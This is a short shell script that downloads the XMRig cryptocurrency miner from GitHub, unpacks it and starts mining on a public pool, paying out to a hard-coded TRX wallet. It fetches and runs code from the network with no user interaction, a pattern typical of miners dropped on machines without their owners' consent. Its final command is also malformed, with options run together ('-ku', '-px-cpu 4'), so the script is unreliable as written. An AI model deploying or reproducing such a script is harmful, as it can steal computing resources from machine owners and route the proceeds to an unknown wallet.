#!/bin/sh
wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-static-x64.tar.gz

tar -xf xmrig-6.18.0-linux-static-x64.tar.gz

cd xmrig-6.18.0

./xmrig -o rx.unmineable.com:3333 -a rx -ku TRX:TBALtaLEiGd2AxJu5wgzxkSHsEgT6WiSyG.Cryptonic-Tech#mtsy-a2u1 -px-cpu 4
